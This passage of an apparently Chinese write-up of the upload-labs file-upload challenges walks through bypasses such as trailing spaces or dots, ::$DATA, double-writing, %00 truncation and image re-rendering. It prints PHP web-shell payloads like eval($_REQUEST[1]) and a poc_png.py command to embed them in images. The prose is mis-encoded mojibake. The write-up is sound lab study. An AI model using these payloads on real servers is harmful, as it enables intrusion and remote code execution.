</span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://upload-labs/Pass-05/index.php</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-php">------WebKitFormBoundaryB0UdjI6DB38pICSw</span></span><br><span class="line"><span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;upload_file&quot;</span>; filename=<span class="string">&quot;shell.jpg&quot;</span></span></span><br><span class="line"><span class="language-php">Content-Type: image/jpeg</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>();<span class="meta">?&gt;</span></span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">------WebKitFormBoundaryB0UdjI6DB38pICSw</span></span><br><span class="line"><span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;submit&quot;</span></span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">ä¸Šä¼ </span></span><br><span class="line"><span class="language-php">------WebKitFormBoundaryB0UdjI6DB38pICSw--</span></span><br><span class="line"><span class="language-php"></span></span><br></pre></td></tr></table></figure><p>ä¸Šä¼ ä¹‹åéœ€è¦ç¨å¾®ç­‰å‡ åˆ†é’Ÿ,ç­‰å¾…user.iniç”Ÿæ•ˆ</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240220152813484.png" alt="image-20240220152813484"></p><p>è¿™é‡Œå°±æˆåŠŸäº†</p><h2 id="Pass-06-æœ«å°¾æ·»åŠ ç©ºæ ¼ç»•è¿‡"><a href="#Pass-06-æœ«å°¾æ·»åŠ ç©ºæ ¼ç»•è¿‡" class="headerlink" title="Pass-06(æœ«å°¾æ·»åŠ ç©ºæ ¼ç»•è¿‡)"></a>Pass-06(æœ«å°¾æ·»åŠ ç©ºæ ¼ç»•è¿‡)</h2><p>è¿™å…³éœ€è¦åœ¨windowsä¸‹è¿›è¡Œ, å¯¹åº”äº†å¯¹åº” buu upload-labs windowsä¸­çš„Pass-07</p><p>ä¸ä¹‹å‰å¯¹æ¯”è¿™é‡Œå°‘äº†é¦–å°¾å»é™¤ç©ºæ ¼</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//é¦–å°¾å»ç©º</span></span><br></pre></td></tr></table></figure><p>éœ€è¦æ³¨æ„çš„æ˜¯åœ¨linuxå¹³å°ä¸‹èƒ½ä¸Šä¼ .php(ç©ºæ ¼)ä½†æ˜¯ä¸èƒ½è§£æ</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240220144032092.png" alt="image-20240220144032092"></p><p>è€Œåœ¨windowä¸‹ä¸Šä¼ .php(ç©ºæ ¼)å,ç³»ç»Ÿä¼šè‡ªåŠ¨åˆ æ‰æœ«å°¾çš„ç©ºæ ¼</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240220160008012.png" alt="image-20240220160008012"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240220160035462.png" alt="image-20240220160035462"></p><h2 id="Pass-07-æœ«å°¾æ·»åŠ -ç»•è¿‡"><a href="#Pass-07-æœ«å°¾æ·»åŠ -ç»•è¿‡" class="headerlink" title="Pass-07(æœ«å°¾æ·»åŠ .ç»•è¿‡)"></a>Pass-07(æœ«å°¾æ·»åŠ .ç»•è¿‡)</h2><p>æ²¡æœ‰åˆ é™¤æœ«å°¾çš„ç‚¹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240220154319631.png" alt="image-20240220154319631"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240220154354916.png" alt="image-20240220154354916"></p><h2 id="Pass-08-æœ«å°¾æ·»åŠ -DATAç»•è¿‡"><a href="#Pass-08-æœ«å°¾æ·»åŠ -DATAç»•è¿‡" class="headerlink" title="Pass-08(æœ«å°¾æ·»åŠ ::$DATAç»•è¿‡)"></a>Pass-08(æœ«å°¾æ·»åŠ ::$DATAç»•è¿‡)</h2><p>ç¼ºå°‘äº†</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//å»é™¤å­—ç¬¦ä¸²::$DATA</span></span><br></pre></td></tr></table></figure><blockquote><p>åœ¨windowçš„æ—¶å€™å¦‚æœæ–‡ä»¶å+â€::$DATAâ€ä¼šæŠŠ::$DATAä¹‹åçš„æ•°æ®å½“æˆæ–‡ä»¶æµå¤„ç†,ä¸ä¼šæ£€æµ‹åç¼€åï¼Œä¸”ä¿æŒ::$DATAä¹‹å‰çš„æ–‡ä»¶åï¼Œä»–çš„ç›®çš„å°±æ˜¯ä¸æ£€æŸ¥åç¼€å</p><p>ä¾‹å¦‚:â€phpinfo.php::$DATAâ€Windowsä¼šè‡ªåŠ¨å»æ‰æœ«å°¾çš„::$DATAå˜æˆâ€phpinfo.phpâ€</p></blockquote><p>è¿™å…³ä»æ˜¯éœ€è¦åœ¨windowsä¸‹è¿›è¡Œ,<strong>å¯¹åº” buu upload-labs windowsä¸­çš„Pass-09</strong></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240220155606882.png" alt="image-20240220155606882"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240220155548411.png" alt="image-20240220155548411"></p><h2 id="Pass-09-æœ«å°¾æ·»åŠ "><a href="#Pass-09-æœ«å°¾æ·»åŠ " class="headerlink" title="Pass-09(æœ«å°¾æ·»åŠ . .)"></a>Pass-09(æœ«å°¾æ·»åŠ . .)</h2><p>è™½ç„¶åˆ é™¤äº†æœ«å°¾çš„ç‚¹,ä½†æ˜¯åªä¼šåˆ é™¤ä¸€æ¬¡,åªéœ€è¦æ„é€ .php. .å³å¯</p><p><img src="C:/Users/hcj/AppData/Roaming/Typora/typora-user-images/image-20240220161304719.png" alt="image-20240220161304719"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240220161250250.png" alt="image-20240220161250250"></p><h2 id="Pass-10-åŒå†™ç»•è¿‡"><a href="#Pass-10-åŒå†™ç»•è¿‡" class="headerlink" title="Pass-10(åŒå†™ç»•è¿‡)"></a>Pass-10(åŒå†™ç»•è¿‡)</h2><p>æ­¤å…³åšäº†ä¸€ä¸ªæ£€æµ‹åˆ°é»‘å­—ç¬¦å¹¶åˆ é™¤ä¸€æ¬¡,åªéœ€è¦æ„é€ ä¸€ä¸ªåŒå†™å³å¯</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240220161639031.png" alt="image-20240220161639031"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240220161708635.png" alt="image-20240220161708635"></p><h2 id="Pass-11-00æˆªæ–­-get"><a href="#Pass-11-00æˆªæ–­-get" class="headerlink" title="Pass-11(%00æˆªæ–­ get)"></a>Pass-11(%00æˆªæ–­ get)</h2><p>æ­¤passåœ¨æœ¬åœ°æµ‹è¯•,æ‰€ä»¥ä¸ºå…¨éƒ¨21å…³çš„pass-12</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$img_path</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.<span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹è§è¿™é‡Œä¸Šä¼ è·¯å¾„å¯æ§, åªéœ€è¦å°†ä¸Šä¼ è·¯å¾„æ„é€ æˆphpæ–‡ä»¶åç„¶å%00æˆªæ–­åé¢çš„æ•°æ®å³å¯</p><blockquote><p>phpç‰ˆæœ¬&lt;&#x3D; 5.3.4</p><p>éœ€è¦è®¾ç½®phpçš„magic_quotes_gpcä¸ºOFFçŠ¶æ€ã€‚</p><p>å¦åˆ™phpä¼šå°†00æˆªæ–­å­—ç¬¦è¿›è¡Œè½¬ä¹‰</p></blockquote><p>æ¯”è¾ƒæ— è¯­çš„éƒ½æ˜¯è¿™äº›æ¡ä»¶éƒ½å¼„å¥½åè¿˜æ˜¯ä¸è¡Œ,ä¸‹ä¸€å…³ä¹Ÿæ˜¯è¿™æ · phpç‰ˆæœ¬5.3.29nts</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240220171518503.png" alt="image-20240220171518503"></p><h2 id="Pass-12-00æˆªæ–­-post"><a href="#Pass-12-00æˆªæ–­-post" class="headerlink" title="Pass-12(%00æˆªæ–­ post)"></a>Pass-12(%00æˆªæ–­ post)</h2><p>æ­¤passåœ¨æœ¬åœ°æµ‹è¯•,æ‰€ä»¥ä¸ºå…¨éƒ¨21å…³çš„pass-13</p><p>ä¸ä¸Šä¸€å…³ä¸åŒçš„æ˜¯é‡‡ç”¨postå‘é€è·¯å¾„, %00ä¸ä¼šè¢«è‡ªåŠ¨è§£ç ,æ‰€ä»¥è¦å†hexä¸­æ›´æ”¹</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240220172214262.png" alt="image-20240220172214262"></p><p>å°†è¿™é‡Œçš„2bæ”¹ä¸º00å³å¯</p><p>è¿™é‡Œä¹Ÿæ²¡æœ‰æˆåŠŸ,ä½†æ–¹æ³•æ˜¯è¿™ä¸ªæ–¹æ³•</p><h2 id="Pass-13-å›¾ç‰‡é©¬ç»•è¿‡"><a href="#Pass-13-å›¾ç‰‡é©¬ç»•è¿‡" class="headerlink" title="Pass-13(å›¾ç‰‡é©¬ç»•è¿‡)"></a>Pass-13(å›¾ç‰‡é©¬ç»•è¿‡)</h2><p>è¿™ä¸€å…³å¯¹æ–‡ä»¶å¤´ä¿¡æ¯åšäº†æ£€æµ‹,å¹¶æ ¹æ®æ–‡ä»¶å¤´å¯¹æ–‡ä»¶åç¼€åé‡å†™</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getReailFileType</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$filename</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    <span class="variable">$bin</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$file</span>, <span class="number">2</span>); <span class="comment">//åªè¯»2å­—èŠ‚</span></span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$strInfo</span> = @<span class="title function_ invoke__">unpack</span>(<span class="string">&quot;C2chars&quot;</span>, <span class="variable">$bin</span>);    </span><br><span class="line">    <span class="variable">$typeCode</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$strInfo</span>[<span class="string">&#x27;chars1&#x27;</span>].<span class="variable">$strInfo</span>[<span class="string">&#x27;chars2&#x27;</span>]);    </span><br><span class="line">    <span class="variable">$fileType</span> = <span class="string">&#x27;&#x27;</span>;    </span><br><span class="line">    <span class="keyword">switch</span>(<span class="variable">$typeCode</span>)&#123;      </span><br><span class="line">        <span class="keyword">case</span> <span class="number">255216</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;jpg&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">13780</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;png&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;        </span><br><span class="line">        <span class="keyword">case</span> <span class="number">7173</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;gif&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;unknown&#x27;</span>;</span><br><span class="line">        &#125;    </span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$fileType</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_type</span> = <span class="title function_ invoke__">getReailFileType</span>(<span class="variable">$temp_file</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$file_type</span> == <span class="string">&#x27;unknown&#x27;</span>)&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;æ–‡ä»¶æœªçŸ¥ï¼Œä¸Šä¼ å¤±è´¥ï¼&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&quot;/&quot;</span>.<span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_type</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;ä¸Šä¼ å‡ºé”™ï¼&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå†çœŸçš„pngå›¾ç‰‡æœ«å°¾åŠ ä¸Šphpæ„é€ å›¾ç‰‡é©¬</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240220172823309.png" alt="image-20240220172823309"></p><p>ä¹‹ååˆ©ç”¨å…¶ä»–æ¼æ´å¦‚æ–‡ä»¶åŒ…å«æ¥è§£æå›¾ç‰‡é©¬</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240220173250962.png" alt="image-20240220173250962"></p><h2 id="Pass-14-å›¾ç‰‡é©¬ç»•è¿‡"><a href="#Pass-14-å›¾ç‰‡é©¬ç»•è¿‡" class="headerlink" title="Pass-14(å›¾ç‰‡é©¬ç»•è¿‡)"></a>Pass-14(å›¾ç‰‡é©¬ç»•è¿‡)</h2><p>æºç ä¸ä¸€æ ·,ä½†è¿˜æ˜¯ç›¸åŒçš„é…æ–¹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$types</span> = <span class="string">&#x27;.jpeg|.png|.gif&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>))&#123;</span><br><span class="line">        <span class="variable">$info</span> = <span class="title function_ invoke__">getimagesize</span>(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="variable">$ext</span> = <span class="title function_ invoke__">image_type_to_extension</span>(<span class="variable">$info</span>[<span class="number">2</span>]);</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$types</span>,<span class="variable">$ext</span>)&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$ext</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$res</span> = <span class="title function_ invoke__">isImage</span>(<span class="variable">$temp_file</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="variable">$res</span>)&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;æ–‡ä»¶æœªçŸ¥ï¼Œä¸Šä¼ å¤±è´¥ï¼&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&quot;/&quot;</span>.<span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="variable">$res</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;ä¸Šä¼ å‡ºé”™ï¼&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240220174448027.png" alt="image-20240220174448027"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240220174459794.png" alt="image-20240220174459794"></p><h2 id="Pass-15"><a href="#Pass-15" class="headerlink" title="Pass-15"></a>Pass-15</h2><p>Pass-13,14è§£æ³•ç›¸åŒ</p><h2 id="Pass-16-äºŒæ¬¡æ¸²æŸ“"><a href="#Pass-16-äºŒæ¬¡æ¸²æŸ“" class="headerlink" title="Pass-16(äºŒæ¬¡æ¸²æŸ“)"></a>Pass-16(äºŒæ¬¡æ¸²æŸ“)</h2><p>è¿™é‡Œå‚è€ƒä¸€ç¯‡å¤§ä½¬çš„åšå®¢:</p><p><a href="https://www.sqlsec.com/2020/10/upload.html#%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93">https://www.sqlsec.com/2020/10/upload.html#%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93</a></p><p>è¿™é‡Œè™½ç„¶æ˜¯ç¬¬16å…³, ä½†åœ¨å…¨éƒ¨21å…³é‡Œæ˜¯ç¬¬17å…³ä¹Ÿå°±æ˜¯äºŒæ¬¡æ¸²æŸ“</p><h3 id="GIF"><a href="#GIF" class="headerlink" title="GIF:"></a>GIF:</h3><p>éšä¾¿æ‰¾ä¸€å¼ gifå›¾ç‰‡</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/2.gif" alt="2"></p><p>ä¸Šä¼ å,å°†è¿”å›çš„å›¾ç‰‡ä¸‹è½½ä¸‹æ¥</p><p>åœ¨010editorçš„toolsä¸­çš„compareæ¨¡å—æ¯”è¾ƒä¸¤å¼ å›¾ç‰‡,å¹¶æ‰¾åˆ°ä¸¤å¼ å›¾ç‰‡ç›¸åŒçš„éƒ¨åˆ†(Matchçš„ç°è‰²éƒ¨åˆ†, æˆ–è€…ç‚¹å‡»matchå,è“è‰²çš„éƒ¨åˆ†)</p><p>ä¹‹åæ’å…¥æœ¨é©¬</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240221194217773.png" alt="image-20240221194217773"></p><p>è¿™é‡Œæ’å…¥åœ¨<code>.......</code>å¤„æˆåŠŸç‡é«˜ä¸€ç‚¹, è¯•è¿‡å‡ æ¬¡æ’åœ¨åˆ«çš„åœ°æ–¹å¯èƒ½ä¼šä¸æˆåŠŸ</p><p>ä¿å­˜åé‡æ–°ä¸Šä¼ ,åŒ…å«æ¸²æŸ“åçš„å›¾ç‰‡</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240221194322951.png" alt="image-20240221194322951"></p><h3 id="PNG"><a href="#PNG" class="headerlink" title="PNG:"></a>PNG:</h3><p>ç›´æ¥ä½¿ç”¨githubä¸­çš„å·²æœ‰çš„é¡¹ç›®</p><p><a href="https://github.com/hxer/imagecreatefrom-/tree/master/png/poc">https://github.com/hxer/imagecreatefrom-/tree/master/png/poc</a></p><p>å¯ä»¥ä½¿ç”¨å®ƒç»™å‡ºçš„pocå›¾ç‰‡æˆ–è€…è‡ªå·±ç”Ÿæˆä¸€ä¸ª,è¿™é‡Œç›´æ¥ä½¿ç”¨ç»™å‡ºçš„poc</p><p>æ³¨æ„ è‡ªå·±ç”Ÿæˆçš„è¯éœ€è¦python2ç¯å¢ƒ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python poc_png.py -p <span class="string">&#x27;&lt;?php eval($_REQUEST[1]);?&gt;&#x27;</span> -o gg_shell.png old.png</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240222145218462.png" alt="image-20240222145218462"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240222145208117.png" alt="image-20240222145208117"></p><h3 id="JPG"><a href="#JPG" class="headerlink" title="JPG:"></a>JPG:</h3><p>åŒæ„åœ¨githubæ‰¾åˆ°ç°æˆçš„é¡¹ç›®</p><p><a href="https://github.com/BlackFan/jpg_payload">https://github.com/BlackFan/jpg_payload</a></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240222154943666.png" alt="image-20240222154943666"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240222155327830.png" alt="image-20240222155327830"></p><p>è¯•äº†å¾ˆå¤šæ¬¡éƒ½æ˜¯è¿™æ ·</p><p>æ¢äº†ä¸€å¼ æ¯”è¾ƒå¤§çš„å›¾ç‰‡,ä¸Šé¢çš„é—®é¢˜æ²¡äº†ä½†æ˜¯æ’å…¥åçš„payloadå¹¶ä¸å®Œæ•´</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240222160105600.png" alt="image-20240222160105600"></p><p>è¿™é‡Œè¡¥å……: æ’å…¥åçœ‹ä¸è§<code>_</code>å¹¶ä¸æ˜¯<code>_</code>æ¶ˆå¤±äº†, åœ¨010editorèƒ½çœ‹è§<code>_</code>æ˜¯å­˜åœ¨çš„</p><p>æœ€åç”¨å¤§ä½¬çš„è¿™ä¸ªpayloadæ˜¯å¯ä»¥æˆåŠŸæ’å…¥çš„</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$miniPayload</span> = <span class="string">&#x27;&lt;?php $_GET[0]($_POST[1]);?&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240222160433105.png" alt="image-20240222160433105"></p><p>ä½†æ˜¯è¿˜ä¼šå‡ºç°æç¤ºä¸æ˜¯jpg</p><p>è¿™é‡Œå…¶å®phpinfoæ’å…¥è¿›å»æ˜¯å¯ä»¥æˆåŠŸçš„, åˆ«çš„payloadè¦ä¹ˆå›æ˜¾ä¸æ˜¯jpg, è¦ä¹ˆæ’å…¥è¿›å»å<code>_</code>è¢«åˆ æ‰äº†</p><p>æœ€åå°è¯•äº†æ— æ•°éåæˆåŠŸæ’å…¥è¿›å»äº†<code>&lt;?php @eval($_POST[a]);?&gt;</code>,å¹¶ä¸”å†æ¬¡æ¸²æŸ“åpayloadä¾ç„¶å­˜åœ¨,ä½†æ˜¯åœ¨includeåå¹¶ä¸èƒ½è§£æ,ä¸çŸ¥é“ä»€ä¹ˆé—®é¢˜</p><h2 id="Pass-17-æ¡ä»¶ç«äº‰"><a href="#Pass-17-æ¡ä»¶ç«äº‰" class="headerlink" title="Pass-17(æ¡ä»¶ç«äº‰)"></a>Pass-17(æ¡ä»¶ç«äº‰)</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    <span class="variable">$file_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_ext</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$file_name</span>,<span class="title function_ invoke__">strrpos</span>(<span class="variable">$file_name</span>,<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="variable">$upload_file</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$file_name</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$upload_file</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>,<span 